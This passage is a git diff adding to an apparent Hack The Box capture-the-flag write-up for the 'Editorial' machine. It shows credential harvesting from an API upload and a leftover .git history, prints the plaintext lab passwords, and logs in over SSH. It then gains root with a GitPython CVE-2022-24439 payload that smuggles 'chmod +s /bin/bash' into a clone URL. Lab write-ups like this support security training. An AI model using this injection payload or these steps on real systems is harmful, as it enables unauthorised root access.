@@ -92,4 +92,104 @@ curl http://editorial.htb/static/uploads/cb53b08d-557b-4eea-a7df-0d713a5d9bbe -s
 
 <figure><img src="../../.gitbook/assets/image (2810).png" alt=""><figcaption></figcaption></figure>
 
-Thu .
+This is a list of API Endpoints. Let's check them out!
+
+The endpoint with the most interesting information is:
+
+```
+/api/latest/metadata/messages/authors
+```
+
+<figure><img src="../../.gitbook/assets/image (2811).png" alt=""><figcaption></figcaption></figure>
+
+{% code overflow="wrap" %}
+```bash
+curl http://editorial.htb/static/uploads/f40b3ce9-34f5-4f69-99a5-e623d95ed55f -s | jq .
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (2812).png" alt=""><figcaption></figcaption></figure>
+
+it contains a username and password!
+
+Testing the creds we discover we have ssh access
+
+```bash
+netexec ssh editorial.htb -u dev -p 'dev080217_devAPI!@'
+```
+
+<figure><img src="../../.gitbook/assets/image (2813).png" alt=""><figcaption></figcaption></figure>
+
+We have ssh access! Let's ssh as dev
+
+```bash
+ssh dev@editorial.htb
+```
+
+<figure><img src="../../.gitbook/assets/image (2814).png" alt=""><figcaption></figcaption></figure>
+
+## <mark style="color:blue;">Privilege Escalation</mark>
+
+### <mark style="color:$primary;">Manual Enumeration</mark>
+
+<figure><img src="../../.gitbook/assets/image (2815).png" alt=""><figcaption></figcaption></figure>
+
+We have another user besides `dev` and `root`. Maybe we can find some credentials for `prod`
+
+<figure><img src="../../.gitbook/assets/image (2816).png" alt=""><figcaption></figcaption></figure>
+
+there is a `.git` directory in dev's apps folder.
+
+Surprisingly the application is not here, it must have been deleted and they must have forgotten to check if the the .git directory was deleted
+
+<figure><img src="../../.gitbook/assets/image (2818).png" alt=""><figcaption></figcaption></figure>
+
+There is an interesting commit let's take a look at what has been changed!
+
+```bash
+git diff 1e84a03 b73481b
+```
+
+<figure><img src="../../.gitbook/assets/image (2819).png" alt=""><figcaption></figcaption></figure>
+
+The password for the prod user is here! Let's ssh as him
+
+```
+prod:080217_Producti0n_2023!@
+```
+
+<figure><img src="../../.gitbook/assets/image (2820).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (2821).png" alt=""><figcaption></figcaption></figure>
+
+The prod user can run a python script with root privileges.&#x20;
+
+<figure><img src="../../.gitbook/assets/image (2822).png" alt=""><figcaption></figcaption></figure>
+
+the script changes directory to `/opt/internal_apps/clone_changes` and takes a URL to clone from
+
+<figure><img src="../../.gitbook/assets/image (2823).png" alt=""><figcaption></figcaption></figure>
+
+The script is also running the Python Git package [**GitPython**](https://github.com/gitpython-developers/GitPython) version 3.1.29
+
+### <mark style="color:$primary;">GitPython 3.1.29 CVE 2022-24439 RCE</mark>
+
+A google search reveals the following CVE
+
+<figure><img src="../../.gitbook/assets/image (2825).png" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://github.com/gitpython-developers/GitPython/issues/1515" %}
+
+<figure><img src="../../.gitbook/assets/image (2826).png" alt=""><figcaption></figcaption></figure>
+
+We can use this to run commands as root. I am going to set the SUID on bash for easy privesc
+
+{% code overflow="wrap" %}
+```bash
+sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c chmod% +s% /bin/bash"
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (2827).png" alt=""><figcaption></figcaption></figure>
+
+And we are root!
